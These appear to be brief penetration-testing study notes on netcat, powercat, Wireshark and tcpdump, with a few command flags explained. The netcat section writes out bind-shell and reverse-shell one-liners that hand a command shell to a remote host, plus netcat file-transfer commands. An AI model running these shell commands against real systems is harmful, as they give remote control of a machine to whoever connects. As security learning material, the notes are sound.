## Netcat
* Connect to server
    -nv 
        -n skip DNS name resolution
        -v verbose
* Listen on a Port
    nc  -nlvp [port]
        -l create a listner,  -p [Port]
* File Transfer
    Receiving:  nc -lvnp [port]  > [filename]
    Sending: nc -nv [ip] [port] < [file]>
* Remote Admin bind
    Host:nc -nlvp [port] -e cmd.exe
    Remote:  nc -nv [ip] [port]
* Reverse Shell
    Remote:  -nlvp [port]
    Host: nc  -nv [ip] [port] -e /bin/bash

## SoCat

## Powercat
Powershell version of Necat
apt install powercat to place it in /usr/share/windows-resources/powercat

## Wireshark
Analyze network traffic

## TCPDUMP
Text based network sniffer
 -n skip DNS name
 -r read from our captuer file
 